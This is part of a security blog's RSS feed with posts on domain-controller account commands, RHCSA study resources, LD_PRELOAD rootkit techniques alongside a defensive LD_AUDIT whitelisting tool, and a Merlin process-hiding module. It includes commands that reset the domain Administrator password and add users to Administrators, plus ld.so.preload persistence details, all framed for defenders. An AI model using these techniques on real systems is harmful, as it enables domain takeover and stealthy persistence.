+&lt;p&gt;During the promotion of a domain controller you may also notice that the process requires you to set a Directory Services Restore Mode password. Once you have promoted the domain controller this account will be the only one stored within the local SAM database and it will not be available for use unless you boot into DSRM mode on the DC for recovery.&lt;/p&gt;
+
+&lt;h2 id=&quot;does-this-really-matter&quot;&gt;Does This Really Matter?&lt;/h2&gt;
+
+&lt;p&gt;It absolutely matters when investigating password resets and assigning permissions within an Active Directory domain.&lt;/p&gt;
+
+&lt;p&gt;Consider these commands:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;net user Administrator Password123
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If this command executes on a non-domain controller system, it will reset the local Administrator account’s password (in the SAM database) to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Password123&lt;/code&gt;. On a domain controller, it will reset the &lt;strong&gt;&lt;em&gt;domain’s&lt;/em&gt;&lt;/strong&gt; Administrator account in NTDS.dit instead. This implies that whoever resets this password will have Administrator access for the entire Active Directory domain and all systems therein rather than just a single system.&lt;/p&gt;
+
+&lt;p&gt;This also implies that any malware that achieves use of the SYSTEM account on a domain controller will be able to escalate to domain privileges as the SYSTEM account will be able to reset user account passwords on the DC.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;net user Joffrey
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If this command executes on a non-DC system, it will add a local user by the name of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Joffrey&lt;/code&gt; to the SAM database. On a DC, it will add a domain user by the same name to NTDS.dit. This is important because performing this action on a DC may circumvent your account creation processes unintentionally.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;net localgroup Administrators /add WESTEROS\Jorah.Mormont
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If this command executes on a non-DC system it will add Jorah’s account to the local Administrators group, entitling him to manage a single computer system. If the command executes on a DC system, Jorah’s account will be added to the Built-In Administrators group in Active Directory. This would entitle Jorah to make changes to Active Directory’s NTDS.dit database, Group Policy Objects, AD Sites, and also allow administrative access on all computers across the domain. This can get very bad very quickly.&lt;/p&gt;
+
+&lt;h2 id=&quot;taking-action&quot;&gt;Taking Action&lt;/h2&gt;
+
+&lt;p&gt;Be vigilent when performing operations on accounts from a domain controller’s command line. Remember that your “local” changes likely aren’t local if they occur on a DC.&lt;/p&gt;
+
+&lt;h2 id=&quot;sources&quot;&gt;Sources&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://social.technet.microsoft.com/Forums/exchange/en-US/2f120e62-52a9-4001-b8e0-15a897f28b7e/is-there-any-possible-to-create-a-local-account-on-domain-controller-not-domain-account?forum=winserverDS&quot;&gt;Technet&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/secmgmt/built-in-and-account-domains?redirectedfrom=MSDN#computers-that-are-domain-controllers&quot;&gt;Microsoft&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        <pubDate>Thu, 09 Jan 2020 00:00:00 -0600</pubDate>
+        <link>https://forensicitguy.github.io/feed.xml/windows/active-directory/domain-controllers/accounts/administrators/2020/01/09/when-local-resets-arent-local.html</link>
+        <guid isPermaLink="true">https://forensicitguy.github.io/feed.xml/windows/active-directory/domain-controllers/accounts/administrators/2020/01/09/when-local-resets-arent-local.html</guid>
+        
+        
+        <category>windows</category>
+        
+        <category>active-directory</category>
+        
+        <category>domain-controllers</category>
+        
+        <category>accounts</category>
+        
+        <category>administrators</category>
+        
+      </item>
+    
+      <item>
+        <title>Road to RHCSA 8 - Getting Started</title>
+        <description>&lt;p&gt;&lt;em&gt;Updated 2020-01-04&lt;/em&gt; - Added the Red Hat Certs Slack group to the community list and lab environment to the lab list.&lt;/p&gt;
+
+&lt;p&gt;Choosing my educational goal for the year always causes a bit of anxiety. I try to find the right balance between something that is fun to learn and something that will help with my day job. Last year, the educational goal was to learn Volatility memory forensics better through a training class. This year I want to do something a little less complex that will help improve my Linux skills since I often focus on malware and threats for Linux during my day job. So, tackling the Red Hat Certified System Administrator certification seems like a good goal. In this post, I’ll go over some of the most recommended resources to start learning for the RHCSA version 8 from Reddit and other sources.&lt;/p&gt;
+
+&lt;h2 id=&quot;exam-details&quot;&gt;Exam Details&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.redhat.com/en/services/training/ex200-red-hat-certified-system-administrator-rhcsa-exam&quot;&gt;Per Red Hat&lt;/a&gt;, the RHCSA is awarded for passing a 2.5 hour exam (EX200). The exam has a practical lab format where the candidate is expected to perform tasks demonstrating mastery of the learning objectives. During the exam, you cannot use Internet or any printed resources, but you can use manpages and documentation shipped with the system.&lt;/p&gt;
+
+&lt;p&gt;For exact objectives, see the &lt;a href=&quot;https://www.redhat.com/en/services/training/ex200-red-hat-certified-system-administrator-rhcsa-exam&quot;&gt;exam page&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;formal-classroom-training&quot;&gt;Formal Classroom Training&lt;/h2&gt;
+
+&lt;p&gt;If you love formal classroom training, Red Hat offers two recommended classes to prepare:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.redhat.com/en/services/training/rh124-red-hat-system-administration-i&quot;&gt;Red Hat System Administration I (RH124)&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.redhat.com/en/services/training/rh134-red-hat-system-administration-ii&quot;&gt;Red Hat System Administration II (RH134)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;These classroom trainings are &lt;strong&gt;NOT&lt;/strong&gt; required and many people find self-study methods sufficient for success.&lt;/p&gt;
+
+&lt;h2 id=&quot;books&quot;&gt;Books&lt;/h2&gt;
+
+&lt;p&gt;Since the RHCSA exam was recently updated for Red Hat Enterprise Linux (RHEL) 8, there’s a shortage of book material. At the time of writing, there’s really only one recommended book- &lt;a href=&quot;http://www.pearsonitcertification.com/store/red-hat-rhcsa-8-cert-guide-ex200-9780135938133&quot;&gt;Red Hat RHCSA 8 Cert Guide: EX200 by Sander van Vugt&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;The book is available via numerous means, but purchasing through Pearson’s site will allow you to get a book + ebook bundle for ePUB, PDF, and MOBI formats. This cost me about $50.&lt;/p&gt;
+
+&lt;p&gt;Michael Jang is another prominent author of RHEL study material, but an updated guide was not available at the time of writing. However, many of the RHCSA v8 objectives overlap with v7 objectives. If you’re looking for a second book you could potentially grab Jang’s book for RHCSA 7 and use it for the overlappng objectives.&lt;/p&gt;
+
+&lt;h2 id=&quot;video-training&quot;&gt;Video Training&lt;/h2&gt;
+
+&lt;p&gt;If you are an absolute beginner to Linux, Red Hat has published &lt;a href=&quot;https://www.udemy.com/course/red-hat-enterprise-linux-technical-overview/&quot;&gt;free videos on Udemy&lt;/a&gt; to get you started.&lt;/p&gt;
+
+&lt;p&gt;Two more video training courses are rather widely recommended. The first is the &lt;a href=&quot;https://linuxacademy.com/course/red-hat-certified-systems-administrator-rhcsa-ex-200-exam-prep/&quot;&gt;RHCSA 8 video course from Linux Academy&lt;/a&gt;. The videos are bite-sized and very easy to consume. In addition, you can test out what you learn with Linux Academy’s playground environment on RHEL and CentOS servers.&lt;/p&gt;
+
+&lt;p&gt;The second recommended video course was the &lt;a href=&quot;http://www.pearsonitcertification.com/store/red-hat-certified-system-administrator-rhcsa-complete-9780135656525&quot;&gt;RHCSA 8 Video Course by Sander van Vugt&lt;/a&gt;. You can purchase this course with a one-time cost or via subscription through &lt;a href=&quot;https://www.oreilly.com/library/view/red-hat-certified/9780135656495/&quot;&gt;O’Reilly Learning&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;hands-on-lab-time&quot;&gt;Hands-On Lab Time&lt;/h2&gt;
+
+&lt;p&gt;To get a good handle on working with RHEL systems, lab time is required to pass the exam. You can achieve this in a few ways.&lt;/p&gt;
+
+&lt;h3 id=&quot;home-lab&quot;&gt;Home Lab&lt;/h3&gt;
+
+&lt;p&gt;You can set up your own physical or virtual lab at home. To do this, you can start with using &lt;a href=&quot;https://centos.org&quot;&gt;CentOS&lt;/a&gt;. This Linux distribution is incredibly similar to RHEL with only a &lt;a href=&quot;https://wiki.centos.org/Manuals/ReleaseNotes/CentOS8.1905#Packages_and_Applications&quot;&gt;few package differences&lt;/a&gt;. The changes mostly revolve around branding, but one major function from RHEL 8 will be missing from CentOS systems- &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subscription-manager&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;If you want the full RHEL experience, you can get a free, limited subscription for development and education. The developer subscription entitles you to unlimited RHEL VMs and one physical host running RHEL. For more details, check out &lt;a href=&quot;https://developers.redhat.com/articles/faqs-no-cost-red-hat-enterprise-linux/&quot;&gt;this FAQ&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;If you’re going to use virtualization in your home lab, RHEL and CentOS should work fine with nearly any hypervisor available from Virtualbox to VMware.&lt;/p&gt;
+
+&lt;p&gt;A good virtual lab setup has been developed by the admin of the Red Hat Cert Slack group here: &lt;a href=&quot;https://github.com/rdbreak/rhcsa8env&quot;&gt;https://github.com/rdbreak/rhcsa8env&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;cloud-systems&quot;&gt;Cloud Systems&lt;/h3&gt;
+
+&lt;p&gt;If you’re not a fan of hosting your own systems, you can also study in a cloud lab environment. AWS support RHEL 8 on its “Free Tier” and DigitalOcean usually supports CentOS. At the time of writing it looks like DigitalOcean may not have an updated CentOS image, however.&lt;/p&gt;
+
+&lt;p&gt;If you subscribe to Linux Academy, you have access to their playground environment. This lets you set up one or more RHEL 8 systems as desired to test your knowledge. There are also hands-on lab exercises with Linux Academy to practice what you watch in videos.&lt;/p&gt;
+
+&lt;p&gt;On the side of “miscellaneous lab training”, a couple more resources have been recommended on Reddit:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;lab.redhat.com&quot;&gt;lab.redhat.com&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;redhatgov.io&quot;&gt;redhatgov.io&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;From what I can tell so far, these resources are far from comprehensive and will only get you a little relevant training for the RHCSA.&lt;/p&gt;
+
+&lt;h2 id=&quot;community&quot;&gt;Community&lt;/h2&gt;
+
+&lt;p&gt;The community I’m most familiar with is &lt;a href=&quot;https://reddit.com/r/redhat&quot;&gt;/r/redhat&lt;/a&gt;, but there is also an awesome &lt;a href=&quot;https://join.slack.com/t/redhat-certs/shared_invite/enQtNTk5MTE3MjkwMDA3LTNlMmUyYjM2ODgzN2QwZjJhNzI1MmI3MThhYzk5NzFkZmVmMDA1YWU2Yzk4MzZkOWRjN2MxYTcyMDVlZDU2NGI&quot;&gt;Slack group&lt;/a&gt; for Red Hat certification study that I’m exploring.&lt;/p&gt;
+
+&lt;h2 id=&quot;product-documentation&quot;&gt;Product Documentation&lt;/h2&gt;
+
+&lt;p&gt;Finally, there are loads of free and open-source resources for learning Linux. Red Hat publishes loads of documentation freely for RHEL: &lt;a href=&quot;https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/&quot;&gt;https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;In addition, you can learn from manpages. These are pages of documentation included with products that you download and install on a Linux system. They may be accessed with commands similar to:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;man systemctl
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;wrapping-up&quot;&gt;Wrapping Up&lt;/h2&gt;
+
+&lt;p&gt;So far, the year is young and I haven’t attempted the RHCSA, yet. Once I do, I’ll update this post with the resources that helped the most. Cheers!&lt;/p&gt;
+</description>
+        <pubDate>Thu, 02 Jan 2020 00:00:00 -0600</pubDate>
+        <link>https://forensicitguy.github.io/feed.xml/redhat/rhcsa/linux/certification/education/2020/01/02/road-to-rhcsa8-00.html</link>
+        <guid isPermaLink="true">https://forensicitguy.github.io/feed.xml/redhat/rhcsa/linux/certification/education/2020/01/02/road-to-rhcsa8-00.html</guid>
+        
+        
+        <category>RedHat</category>
+        
+        <category>RHCSA</category>
+        
+        <category>Linux</category>
+        
+        <category>certification</category>
+        
+        <category>education</category>
+        
+      </item>
+    
+      <item>
+        <title>Whitelisting LD_PRELOAD for Fun and No Profit</title>
+        <description>&lt;p&gt;If you’ve been around the Linux/BSD/Solaris/Other UNIX ecosystem for a while you’ve probably heard of the fabled LD_PRELOAD trick. If you haven’t heard of it, let me introduce you to one of the longest-held, dirty security issues in UNIX…&lt;/p&gt;
+
+&lt;h2 id=&quot;a-brief-look-at-ld_preload&quot;&gt;A Brief Look at LD_PRELOAD&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/whitelisting-ld_preload-fun-no-profit/ld_preload-header.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;LD_PRELOAD is an environment variable used by the dynamic linker on UNIX-based systems. Normally the dynamic linker follows a specified search pattern to load various dynamic libraries (shared objects on UNIX). Libraries specified using the LD_PRELOAD variable are loaded before the ones typically required by whatever command you’ll execute. It also goes one step further, libraries specified in LD_PRELOAD are loaded by commands even if their executables don’t require the preloaded binaries for operation.&lt;/p&gt;
+
+&lt;p&gt;This is an insanely easy way to introduce malicious code to a system. Preloaded libraries allow an adversary some extra advantages. First, an adversary has the ability to hook system calls or library calls. In at least one project, &lt;a href=&quot;https://github.com/gianlucaborello/libprocesshider&quot;&gt;libprocesshider&lt;/a&gt;, this functionality is leveraged to taint the contents of a directory listing to hide processes. It doesn’t stop there, either. As shown in the &lt;a href=&quot;https://github.com/dsnezhkov/zombieant&quot;&gt;Zombie Ant Farm project&lt;/a&gt;, adversaries don’t need specific information about the internals of binaries to execute their evil code. In the case of the ZAF project, it’s shown that adversaries can implement functions that execute at the load or unload of preloaded binaries. This means that adversaries can execute code by simply specifying a library is a preload and waiting for a legitimate user to execute something.&lt;/p&gt;
+
+&lt;p&gt;This functionality is implemented by the the dynamic linker (rtld.c source file for the geeks out there). It’s been an issue in Linux systems specifically for at least 20 years, longer in UNIX as a whole. To make matters a bit worse, this can play havoc with security tooling. First off, security tools aren’t always aware of environment variables. In the case of endpoint detection and response (EDR) tooling, environment variables aren’t even visible most of the time. In other cases, security tools may even become victims of LD_PRELOAD if they aren’t statically linked with code they need to execute.&lt;/p&gt;
+
+&lt;p&gt;Oh, and adversaries with root privileges can make preloads load in any process on a system by creating the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/ld.so.preload&lt;/code&gt; and specifying the path of their preload library within. When done properly, adversaries can persist and evade defenses indefinitely on a system using this technique.&lt;/p&gt;
+
+&lt;p&gt;By the way, there’s not really an easy way to disable LD_PRELOAD - &lt;a href=&quot;https://security.stackexchange.com/questions/63599/is-there-any-way-to-block-ld-preload-and-ld-library-path-on-linux&quot;&gt;https://security.stackexchange.com/questions/63599/is-there-any-way-to-block-ld-preload-and-ld-library-path-on-linux&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;There are some useful abilities to LD_PRELOAD, though. It’s sometimes handy to hook functions that already exist in various applications or libraries to test or debug code. From what I can tell, this and performance monitoring are pretty much the only legitimate uses of it. Even the source and manpages say preloading shouldn’t be used long-term.&lt;/p&gt;
+
+&lt;h2 id=&quot;auditing-preload-libraries&quot;&gt;Auditing Preload Libraries&lt;/h2&gt;
+
+&lt;p&gt;During my day job at &lt;a href=&quot;https://redcanary.com/&quot;&gt;Red Canary&lt;/a&gt;, I’ve spent a lot of time diving into Linux threats of various forms. LD_PRELOAD kept showing up in the form of userspace rootkits. &lt;a href=&quot;https://github.com/chokepoint/azazel&quot;&gt;Azazel&lt;/a&gt;, &lt;a href=&quot;https://www.intezer.com/blog-hiddenwasp-malware-targeting-linux-systems/&quot;&gt;HiddenWasp&lt;/a&gt;/&lt;a href=&quot;https://medium.com/chronicle-blog/winnti-more-than-just-windows-and-gates-e4f03436031a&quot;&gt;Winnti&lt;/a&gt;/Highnoon.Linux, nation-state malware, and other threats have used LD_PRELOAD to evade defenders and persist within systems. I became really disconcerted at the lack of visibility around this threat. The closest bit of visibility I could find was implemented in osquery (&lt;a href=&quot;https://www.alienvault.com/blogs/labs-research/hunting-for-linux-library-injection-with-osquery&quot;&gt;Alienvault&lt;/a&gt;, &lt;a href=&quot;https://github.com/palantir/osquery-configuration/blob/master/Classic/Servers/Linux/osquery.conf&quot;&gt;Palantir&lt;/a&gt;) and with select hunts using shell &lt;a href=&quot;https://twitter.com/ForensicITGuy/status/1153291548978794496&quot;&gt;commands&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;And then I read the manpage for rtld-audit- &lt;a href=&quot;http://man7.org/linux/man-pages/man7/rtld-audit.7.html&quot;&gt;http://man7.org/linux/man-pages/man7/rtld-audit.7.html&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;It turns out there’s an audit API exposed by the dynamic linker that may be leveraged by libraries specified in another environment variable- LD_AUDIT. In my spare time, I initially dove into this API exploring a function named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;la_preinit()&lt;/code&gt; which lets an audit library take actions after all libraries have been loaded but before control is passed to the executable. My hope was to implement visibility folks could use by logging preloads that have been mapped to syslog. I started out with Golang and then Rust, but neither language would compile properly for an LD_AUDIT library (although they can be used with LD_PRELOAD).&lt;/p&gt;
+
+&lt;p&gt;So I started learning C and test-driven development. Around this time I read the manpage for rtld-audit in more depth, noting one particular function- &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;la_objsearch()&lt;/code&gt;. When the dynamic linker loads libraries for execution, it has to reconcile libraries requested by an ELF binary and find them on disk. When the linker searches for a particular library, it triggers the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;la_objsearch()&lt;/code&gt; function. The function typically returns the name a linker should use to further search for a library.&lt;/p&gt;
+
+&lt;p&gt;Then I read this line- &lt;strong&gt;“If NULL is returned, then this pathname is ignored for further processing.”&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/whitelisting-ld_preload-fun-no-profit/curiosity-attention.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Could it be that simple? I set off to start another project around whitelisting LD_PRELOAD binaries with a simple design. I wanted to implement &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;la_objsearch()&lt;/code&gt;, check each library loaded against the known lists of preloads (environment variable and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ld.so.preload&lt;/code&gt;) and then return NULL for each preload that wasn’t also included in a known-good list. I was shocked to discover that this approach actually worked!&lt;/p&gt;
+
+&lt;h2 id=&quot;introducing-libpreloadvaccine&quot;&gt;Introducing libpreloadvaccine!&lt;/h2&gt;
+
+&lt;p&gt;The result of this research and project is &lt;a href=&quot;https://github.com/ForensicITGuy/libpreloadvaccine&quot;&gt;libpreloadvaccine&lt;/a&gt;. This tool is designed to load with every process execution, checking library loads against preload lists. If a preload search is attempted and isn’t allowed, libpreloadvaccine instructs the dynamic linker to ignore the preload. This hinders the successful execution of libraries using LD_PRELOAD.&lt;/p&gt;
+
+&lt;p&gt;Admittedly, this is the first version of the tool and it likely needs a bit extra work. Definitely test this before putting into production in your server farms! I’d love to see this functionality built into the dynamic linker itself, making this tool redundant. Until then, this is designed to help shore up systems against the LD_PRELOAD threat. I’m offering libpreloadvaccine to the public as open source code with a MIT License. Go forth and make the world a better place using it where you can!&lt;/p&gt;
+
+&lt;p&gt;Here it is in action against a module from Merlin:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/whitelisting-ld_preload-fun-no-profit/libpreloadvaccine-in-action.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;installing-libpreloadvaccine&quot;&gt;Installing libpreloadvaccine&lt;/h2&gt;
+
+&lt;p&gt;To install libpreloadvaccine, first build it for your system by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;make build&lt;/code&gt;. Copy the compiled shared object into the preferred library folder of your system. Then export the environment variable LD_AUDIT defining the path of your libpreloadvaccine library.&lt;/p&gt;
+
+&lt;p&gt;To make it persistent, add a line like this to your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/profile&lt;/code&gt; file:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;export LD_AUDIT=&amp;lt;path to libpreloadvaccine&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If you want to whitelist preloads, create a space-delimited list at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/libpreloadvaccine.allow&lt;/code&gt;. Preload paths found in this list will be allowed for execution.&lt;/p&gt;
+
+&lt;p&gt;Go forth and be excellent!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/whitelisting-ld_preload-fun-no-profit/be-excellent.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Thu, 29 Aug 2019 00:00:00 -0500</pubDate>
+        <link>https://forensicitguy.github.io/feed.xml/ld_preload/linux/whitelisting/unix/ld_audit/libpreloadvaccine/2019/08/29/whitelisting-ld_preload-for-fun-and-no-profit.html</link>
+        <guid isPermaLink="true">https://forensicitguy.github.io/feed.xml/ld_preload/linux/whitelisting/unix/ld_audit/libpreloadvaccine/2019/08/29/whitelisting-ld_preload-for-fun-and-no-profit.html</guid>
+        
+        
+        <category>ld_preload</category>
+        
+        <category>linux</category>
+        
+        <category>whitelisting</category>
+        
+        <category>unix</category>
+        
+        <category>ld_audit</category>
+        
+        <category>libpreloadvaccine</category>
+        
+      </item>
+    
+      <item>
+        <title>Adding Process Hiding to Merlin</title>
+        <description>&lt;p&gt;Sometimes red team tools need a little bit of extra love to address certain platforms. As I researched Merlin for detection strategies on the blue team side, I noticed that it could use some extra functionality to help replicate what we see in the real world for Linux compromises.&lt;/p&gt;
+
+&lt;p&gt;One particular technique that fascinated me was the combination of LD_PRELOAD with libprocesshider to gain a little bit of rootkit functionality and hide processes from casual observers. This technique has been used in the wild by Rocke and Pancha Group during cryptojacking campaigns.&lt;/p&gt;
+
+&lt;p&gt;Once I looked through the extensible module functionality in Merlin, I realized we could fairly easily download, compile, and load libprocesshider as a shared object using /etc/ld.so.preload as long as the Merlin agent has root privileges. With the default module options, the module will hide the Merlin agent itself from observation. If you modify the options, you can choose to hide other processes executing on the system.&lt;/p&gt;
+
+&lt;h2 id=&quot;detection-notes&quot;&gt;Detection Notes&lt;/h2&gt;
+&lt;p&gt;This wouldn’t be complete without some notes for the blue team for detection! There are a easy search/hunt you can use to find this activity- look for the modification of /etc/ld.so.preload. This file isn’t commonly modified outside security or performance monitoring applications.&lt;/p&gt;
+</description>
+        <pubDate>Wed, 28 Aug 2019 00:00:00 -0500</pubDate>
+        <link>https://forensicitguy.github.io/feed.xml/merlin/ld_preload/red_team/2019/08/28/adding-process-hiding-to-merlin.html</link>
+        <guid isPermaLink="true">https://forensicitguy.github.io/feed.xml/merlin/ld_preload/red_team/2019/08/28/adding-process-hiding-to-merlin.html</guid>
+        
+        
+        <category>merlin</category>
+        
+        <category>ld_preload</category>
+        
+        <category>red_team</category>
+        
+      </item>
+    
+  </channel>
+</rss>
